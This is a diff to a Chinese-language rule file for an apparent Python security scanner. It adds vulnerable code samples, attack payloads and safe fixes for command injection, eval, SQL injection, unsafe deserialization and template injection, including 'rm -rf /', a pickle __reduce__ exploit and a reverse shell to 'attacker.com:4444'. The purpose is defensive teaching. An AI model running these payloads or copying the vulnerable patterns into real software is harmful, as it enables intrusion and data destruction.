@@ -37,10 +37,38 @@ rules:
     description: |
       os.system/popen 系列函数直接执行 shell 命令，
       如果参数包含用户输入，将导致远程命令执行漏洞。
+    example: |
+      # 漏洞代码示例
+      @app.route('/ping')
+      def ping():
+          host = request.args.get('host')
+          # 危险：用户输入直接拼接到命令
+          os.system(f"ping -c 1 {host}")
+          return "Done"
+
+      # 攻击载荷: ?host=127.0.0.1;cat /etc/passwd
+    attack_scenario: |
+      攻击者通过分号、管道符等shell元字符注入恶意命令，
+      可执行任意系统命令，获取服务器控制权。
     fix_suggestion: |
       1. 使用 subprocess.run() 配合 shell=False 和参数列表
       2. 使用 shlex.quote() 转义用户输入
       3. 实现命令白名单机制
+
+      # 安全代码示例
+      import subprocess
+      import shlex
+
+      @app.route('/ping')
+      def ping():
+          host = request.args.get('host')
+          # 验证输入格式
+          if not re.match(r'^[\w.-]+$', host):
+              return "Invalid host", 400
+          # 使用列表参数，避免shell注入
+          result = subprocess.run(['ping', '-c', '1', host],
+                                  capture_output=True, shell=False)
+          return result.stdout
     cwe_ids: ["CWE-78"]
     owasp_ids: ["A03:2021"]
     tags: [rce, command_injection, critical]
@@ -62,10 +90,37 @@ rules:
     description: |
       subprocess 模块的命令执行函数，当 shell=True 或参数拼接用户输入时，
       可能导致命令注入。
+    example: |
+      # 漏洞代码示例 1: shell=True 危险用法
+      @app.route('/convert')
+      def convert():
+          filename = request.args.get('file')
+          # 危险：shell=True 且用户输入拼接
+          subprocess.call(f"convert {filename} output.png", shell=True)
+          return "Done"
+
+      # 漏洞代码示例 2: getoutput 无法禁用 shell
+      output = subprocess.getoutput(f"ls {user_input}")
+
+      # 攻击载荷: ?file=test.jpg;rm -rf /
+    attack_scenario: |
+      当 shell=True 时，攻击者可注入 shell 元字符执行任意命令。
+      getoutput/getstatusoutput 内部始终使用 shell，更加危险。
     fix_suggestion: |
       1. 设置 shell=False（默认值）
       2. 使用列表形式传递命令和参数，不要字符串拼接
       3. 验证用户输入符合预期格式
+
+      # 安全代码示例
+      @app.route('/convert')
+      def convert():
+          filename = request.args.get('file')
+          # 验证文件名只包含安全字符
+          if not re.match(r'^[\w.-]+$', filename):
+              return "Invalid filename", 400
+          # 使用列表参数，shell=False
+          subprocess.run(['convert', filename, 'output.png'], shell=False)
+          return "Done"
     cwe_ids: ["CWE-78"]
     owasp_ids: ["A03:2021"]
     tags: [rce, subprocess, critical]
@@ -84,10 +139,40 @@ rules:
     description: |
       eval/exec/compile 可执行任意 Python 代码，
       绝对不应该用于处理用户输入。
+    example: |
+      # 漏洞代码示例 1: eval 执行用户输入
+      @app.route('/calc')
+      def calculator():
+          expr = request.args.get('expr')
+          # 危险：直接执行用户输入
+          result = eval(expr)
+          return str(result)
+
+      # 漏洞代码示例 2: exec 执行动态代码
+      code = request.form.get('code')
+      exec(code)  # RCE
+
+      # 攻击载荷: ?expr=__import__('os').system('id')
+    attack_scenario: |
+      攻击者可通过 __import__、__builtins__ 等内置对象
+      绕过简单过滤，执行任意 Python 代码实现 RCE。
     fix_suggestion: |
       1. 避免使用 eval/exec 处理用户输入
       2. 如需解析数据，使用 ast.literal_eval() 替代 eval()
       3. 如需动态功能，使用白名单映射
+
+      # 安全代码示例
+      import ast
+
+      @app.route('/calc')
+      def calculator():
+          expr = request.args.get('expr')
+          try:
+              # ast.literal_eval 只能解析字面量
+              result = ast.literal_eval(expr)
+              return str(result)
+          except (ValueError, SyntaxError):
+              return "Invalid expression", 400
     cwe_ids: ["CWE-94", "CWE-95"]
     owasp_ids: ["A03:2021"]
     tags: [rce, code_injection, critical]
@@ -100,9 +185,28 @@ rules:
     languages: [python]
     patterns:
       - pty.spawn
-    description: pty.spawn 可生成交互式 shell，常用于反弹 shell
+    description: |
+      pty.spawn 可生成交互式 shell，常用于反弹 shell 攻击。
+    example: |
+      # 漏洞代码示例: 反弹 shell
+      import pty
+      import socket
+
+      s = socket.socket()
+      s.connect(("attacker.com", 4444))
+      pty.spawn("/bin/bash")  # 生成交互式 shell
+
+      # 常见于 webshell 和后门代码中
+    attack_scenario: |
+      攻击者上传恶意代码后，通过 pty.spawn 获取交互式 shell，
+      可完全控制服务器。
+    fix_suggestion: |
+      1. 生产代码中禁止使用 pty.spawn
+      2. 使用 WAF 检测反弹 shell 行为
+      3. 监控异常的网络外连行为
     cwe_ids: ["CWE-78"]
-    tags: [rce, shell]
+    owasp_ids: ["A03:2021"]
+    tags: [rce, shell, critical]
 
   # ===========================================================================
   # 第二部分: SQL 注入 - Critical/High
@@ -124,10 +228,36 @@ rules:
     description: |
       直接执行 SQL 语句时，如果使用字符串拼接构造 SQL，
       将导致 SQL 注入漏洞。
+    example: |
+      # 漏洞代码示例
+      @app.route('/user/<user_id>')
+      def get_user(user_id):
+          conn = get_db_connection()
+          cursor = conn.cursor()
+          # 危险：字符串拼接 SQL
+          sql = f"SELECT * FROM users WHERE id = {user_id}"
+          cursor.execute(sql)
+          return cursor.fetchone()
+
+      # 攻击载荷: /user/1 OR 1=1--
+    attack_scenario: |
+      攻击者通过注入 SQL 片段，可以：
+      1. 绕过认证 (OR 1=1)
+      2. 泄露数据 (UNION SELECT)
+      3. 修改/删除数据 (UPDATE/DELETE)
+      4. 执行系统命令 (xp_cmdshell)
     fix_suggestion: |
       1. 使用参数化查询 cursor.execute(sql, params)
       2. 使用 ORM 的查询构建器
       3. 永远不要拼接用户输入到 SQL 字符串
+
+      # 安全代码示例
+      @app.route('/user/<user_id>')
+      def get_user(user_id):
+          cursor = conn.cursor()
+          # 使用参数化查询
+          cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+          return cursor.fetchone()
     cwe_ids: ["CWE-89"]
     owasp_ids: ["A03:2021"]
     tags: [sqli, database, critical]
@@ -279,10 +409,41 @@ rules:
     description: |
       pickle 反序列化不可信数据会导致远程代码执行。
       pickle 可以序列化任意 Python 对象，包括恶意代码。
+    example: |
+      # 漏洞代码示例
+      import pickle
+      import base64
+
+      @app.route('/load')
+      def load_data():
+          data = request.args.get('data')
+          # 危险：反序列化用户输入
+          obj = pickle.loads(base64.b64decode(data))
+          return str(obj)
+
+      # 恶意 payload 构造示例
+      import os
+      class Exploit:
+          def __reduce__(self):
+              return (os.system, ('id',))
+      payload = base64.b64encode(pickle.dumps(Exploit()))
+    attack_scenario: |
+      攻击者构造恶意 pickle 数据，利用 __reduce__ 方法
+      在反序列化时执行任意代码，实现 RCE。
     fix_suggestion: |
       1. 永远不要反序列化不可信来源的数据
       2. 使用 JSON 等安全格式替代 pickle
       3. 如必须使用 pickle，使用 hmac 验证数据完整性
+
+      # 安全代码示例
+      import json
+
+      @app.route('/load')
+      def load_data():
+          data = request.args.get('data')
+          # 使用 JSON 替代 pickle
+          obj = json.loads(data)
+          return str(obj)
     cwe_ids: ["CWE-502"]
     owasp_ids: ["A08:2021"]
     tags: [deserialization, rce, critical]
@@ -300,10 +461,37 @@ rules:
     description: |
       yaml.load() 默认使用 FullLoader，仍存在代码执行风险。
       只有 yaml.safe_load() 是安全的。
+    example: |
+      # 漏洞代码示例
+      import yaml
+
+      @app.route('/config')
+      def load_config():
+          config_data = request.form.get('config')
+          # 危险：yaml.load 可执行代码
+          config = yaml.load(config_data, Loader=yaml.FullLoader)
+          return str(config)
+
+      # 恶意 YAML payload
+      # !!python/object/apply:os.system ['id']
+    attack_scenario: |
+      攻击者通过 YAML 的 Python 对象标签（!!python/object）
+      在解析时执行任意 Python 代码。
     fix_suggestion: |
       使用 yaml.safe_load() 替代 yaml.load()
+
+      # 安全代码示例
+      import yaml
+
+      @app.route('/config')
+      def load_config():
+          config_data = request.form.get('config')
+          # safe_load 只解析基本数据类型
+          config = yaml.safe_load(config_data)
+          return str(config)
     cwe_ids: ["CWE-502"]
-    tags: [deserialization, yaml]
+    owasp_ids: ["A08:2021"]
+    tags: [deserialization, yaml, critical]
 
   - id: py-deserialize-marshal
     name: 反序列化 - marshal 模块
@@ -314,9 +502,30 @@ rules:
     patterns:
       - marshal.loads
       - marshal.load
-    description: marshal 用于 Python 字节码序列化，反序列化恶意数据会执行代码
+    description: |
+      marshal 用于 Python 字节码序列化，反序列化恶意数据会执行代码。
+    example: |
+      # 漏洞代码示例
+      import marshal
+
+      @app.route('/run')
+      def run_code():
+          code_data = request.get_data()
+          # 危险：反序列化字节码并执行
+          code_obj = marshal.loads(code_data)
+          exec(code_obj)
+
+      # marshal 可序列化代码对象，极其危险
+    attack_scenario: |
+      攻击者发送恶意字节码，通过 marshal 反序列化后执行，
+      可实现任意代码执行。
+    fix_suggestion: |
+      1. 禁止从不可信来源加载 marshal 数据
+      2. marshal 仅用于 .pyc 文件，不应用于网络传输
+      3. 使用 JSON 等安全格式
     cwe_ids: ["CWE-502"]
-    tags: [deserialization]
+    owasp_ids: ["A08:2021"]
+    tags: [deserialization, critical]
 
   - id: py-deserialize-jsonpickle
     name: 反序列化 - jsonpickle
@@ -327,9 +536,30 @@ rules:
     patterns:
       - jsonpickle.decode
       - jsonpickle.loads
-    description: jsonpickle 扩展了 JSON，支持任意 Python 对象，存在 RCE 风险
+    description: |
+      jsonpickle 扩展了 JSON，支持任意 Python 对象，存在 RCE 风险。
+    example: |
+      # 漏洞代码示例
+      import jsonpickle
+
+      @app.route('/api/data')
+      def load_data():
+          json_data = request.get_json()
+          # 危险：jsonpickle 可重建任意对象
+          obj = jsonpickle.decode(json_data)
+          return str(obj)
+
+      # 恶意 JSON payload 包含 py/object 标签
+    attack_scenario: |
+      jsonpickle 使用 JSON 格式但支持 Python 对象序列化，
+      攻击者可构造恶意 JSON 触发代码执行。
+    fix_suggestion: |
+      1. 使用标准 json 模块替代 jsonpickle
+      2. 如需序列化复杂对象，使用 dataclass + json
+      3. 设置 jsonpickle.set_encoder_options('json', ensure_ascii=False)
     cwe_ids: ["CWE-502"]
-    tags: [deserialization, jsonpickle]
+    owasp_ids: ["A08:2021"]
+    tags: [deserialization, jsonpickle, critical]
 
   # ===========================================================================
   # 第五部分: SSRF - High
@@ -426,11 +656,36 @@ rules:
     description: |
       Jinja2 模板引擎如果模板内容来自用户输入，
       攻击者可利用模板语法执行任意 Python 代码。
+    example: |
+      # 漏洞代码示例
+      from flask import render_template_string
+
+      @app.route('/hello')
+      def hello():
+          name = request.args.get('name')
+          # 危险：用户输入作为模板内容
+          template = f"Hello {name}!"
+          return render_template_string(template)
+
+      # 攻击载荷: ?name={{config.items()}}
+      # RCE 载荷: ?name={{''.__class__.__mro__[1].__subclasses__()}}
+    attack_scenario: |
+      攻击者通过 Jinja2 模板语法访问 Python 对象，
+      利用 __class__.__mro__.__subclasses__() 链获取危险类，
+      最终实现任意代码执行。
     fix_suggestion: |
       1. 永远不要将用户输入作为模板内容
       2. 用户输入应作为模板变量传入
       3. 使用沙箱环境 SandboxedEnvironment
+
+      # 安全代码示例
+      @app.route('/hello')
+      def hello():
+          name = request.args.get('name')
+          # 用户输入作为变量，不是模板
+          return render_template_string("Hello {{ name }}!", name=name)
     cwe_ids: ["CWE-94"]
+    owasp_ids: ["A03:2021"]
     tags: [ssti, template_injection, critical]
 
   - id: py-ssti-django
